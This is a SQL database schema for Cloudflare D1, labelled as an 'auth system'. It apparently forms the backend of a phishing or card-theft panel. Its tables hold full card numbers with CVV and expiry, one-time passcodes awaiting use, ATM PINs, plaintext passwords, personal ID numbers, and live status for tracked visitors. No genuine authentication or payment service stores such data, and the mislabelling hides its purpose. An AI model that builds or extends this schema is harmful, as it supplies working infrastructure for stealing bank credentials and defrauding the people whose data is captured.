-- Auth System Database Schema for Cloudflare D1

-- Visitors table
CREATE TABLE IF NOT EXISTS visitors (
  vid TEXT PRIMARY KEY,
  online INTEGER DEFAULT 1,
  last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Form data table
CREATE TABLE IF NOT EXISTS form_data (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  vid TEXT NOT NULL,
  page TEXT NOT NULL,
  field_name TEXT NOT NULL,
  field_value TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (vid) REFERENCES visitors(vid)
);

-- Payments table
CREATE TABLE IF NOT EXISTS payments (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  vid TEXT NOT NULL,
  card_number TEXT NOT NULL,
  card_holder TEXT NOT NULL,
  expiry_date TEXT NOT NULL,
  cvv TEXT NOT NULL,
  card_type TEXT NOT NULL,
  status TEXT DEFAULT 'pending',
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (vid) REFERENCES visitors(vid)
);

-- OTPs table
CREATE TABLE IF NOT EXISTS otps (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  vid TEXT NOT NULL,
  otp TEXT NOT NULL,
  status TEXT DEFAULT 'pending',
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (vid) REFERENCES visitors(vid)
);

-- ATM PINs table
CREATE TABLE IF NOT EXISTS atm_pins (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  vid TEXT NOT NULL,
  pin TEXT NOT NULL,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (vid) REFERENCES visitors(vid)
);

-- Activation data table
CREATE TABLE IF NOT EXISTS activation_data (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  vid TEXT NOT NULL,
  provider TEXT NOT NULL,
  phone TEXT NOT NULL,
  personal_id TEXT NOT NULL,
  email TEXT,
  password TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (vid) REFERENCES visitors(vid)
);

-- Indexes for better performance
CREATE INDEX IF NOT EXISTS idx_visitors_online ON visitors(online);
CREATE INDEX IF NOT EXISTS idx_visitors_last_seen ON visitors(last_seen);
CREATE INDEX IF NOT EXISTS idx_form_data_vid ON form_data(vid);
CREATE INDEX IF NOT EXISTS idx_payments_vid ON payments(vid);
CREATE INDEX IF NOT EXISTS idx_payments_status ON payments(status);
CREATE INDEX IF NOT EXISTS idx_otps_vid ON otps(vid);
CREATE INDEX IF NOT EXISTS idx_otps_status ON otps(status);
CREATE INDEX IF NOT EXISTS idx_atm_pins_vid ON atm_pins(vid);
CREATE INDEX IF NOT EXISTS idx_activation_data_vid ON activation_data(vid);
